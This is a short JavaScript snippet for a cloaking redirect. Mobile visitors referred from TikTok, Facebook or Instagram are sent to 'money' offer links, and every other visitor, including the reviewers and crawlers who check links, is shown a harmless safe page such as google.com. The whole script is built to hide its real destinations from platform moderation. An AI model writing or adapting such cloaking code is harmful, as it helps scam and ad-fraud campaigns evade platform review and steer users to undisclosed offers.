<script>
// ================= CONFIG =================
const links = {
  a1: {
    money: "https://offer-money-link.com",
    safe: "https://google.com"
  },
  b2: {
    money: "https://another-offer.com",
    safe: "https://cdn.videy.co/8scghHD91.mp4"
  }
};

const allowedReferrer = ["tiktok", "facebook", "instagram"];
const delay = 1200; // ms
// =========================================

// GET PARAM
const params = new URLSearchParams(window.location.search);
const id = params.get("id");

// BASIC CHECKS
const ua = navigator.userAgent.toLowerCase();
const ref = document.referrer.toLowerCase();

const isMobile = /android|iphone|ipad/i.test(ua);
const isAllowedRef = allowedReferrer.some(r => ref.includes(r));

let target = links[id]?.safe || "https://google.com";

if (isMobile && isAllowedRef && links[id]) {
  target = links[id].money;
}

// REDIRECT
setTimeout(() => {
  window.location.href = target;
}, delay);
</script>
